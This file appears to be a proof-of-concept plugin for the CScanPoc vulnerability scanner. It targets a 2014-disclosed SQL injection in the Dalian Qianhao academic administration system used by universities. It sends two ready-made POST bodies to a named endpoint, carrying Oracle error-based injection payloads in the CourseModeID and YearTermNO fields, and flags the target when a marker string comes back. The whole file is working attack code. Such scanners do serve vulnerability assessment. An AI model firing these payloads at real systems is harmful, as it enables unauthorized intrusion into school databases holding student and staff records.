# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'dalianqianhao_0002'  # 平台漏洞编号，留空
    name = '大连乾豪综合教务管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-06-18'  # 漏洞公布时间
    desc = '''
        大连乾豪综合教务管理系统致力于高校信息化软件的研究与开发。目前在高校信息化方面已经形成了一套完整的信息化解决方案，本方案的目标是整合高校的管理数据和教学资源。
        大连乾豪综合教务管理系统SQL注入漏洞：
        /ACTIONQUERYELECTIVERESULTBYTEACHSECRETARY.APPPROCESS?mode=2
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=065322'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乾豪综合教务管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e609e070-a7be-463a-92f3-ed1099c4ef47'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-065322
            payload = '/ACTIONQUERYELECTIVERESULTBYTEACHSECRETARY.APPPROCESS?mode=2'
            target = self.target + payload
            posts = [
                "bt_DYXZ=%b4%f2%d3%a1%d1%a1%d6%d0&bt_FXXD=%b7%b4%cf%f2%d1%a1%b6%a8&bt_QBCX=%c8%ab%b2%bf%b3%b7%cf%fa&bt_QBXZ=%c8%ab%b2%bf%d1%a1%d6%d0&CourseModeID=1)%20and%201=utl_inaddr.get_host_address('hen'||'tai')%20and%20(1=1&ReportTitle=%b9%fe%b6%fb%b1%f5%c9%cc%d2%b5%b4%f3%d1%a72014-2015%d1%a7%c4%ea%b5%da%b6%fe%d1%a7%c6%da%c9%cf%bf%ce%d1%a7%c9%fa%c3%fb%b5%a5&ScheduleSwitch=0&TeacherNO=130112&YearTermNO=16",
                "bt_DYXZ=%b4%f2%d3%a1%d1%a1%d6%d0&bt_FXXD=%b7%b4%cf%f2%d1%a1%b6%a8&bt_QBCX=%c8%ab%b2%bf%b3%b7%cf%fa&bt_QBXZ=%c8%ab%b2%bf%d1%a1%d6%d0&CourseModeID=1&ReportTitle=%b9%fe%b6%fb%b1%f5%c9%cc%d2%b5%b4%f3%d1%a72014-2015%d1%a7%c4%ea%b5%da%b6%fe%d1%a7%c6%da%c9%cf%bf%ce%d1%a7%c9%fa%c3%fb%b5%a5&ScheduleSwitch=0&TeacherNO=1&YearTermNO=1%20and%201=utl_inaddr.get_host_address('hen'||'tai')"
            ]
            for post in posts:
                code, head, body, errcode, final_url = hh.http(
                    target, post=post)
                if code == 200 and 'hentai' in body:
                    #security_warning(target+' has post inject')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
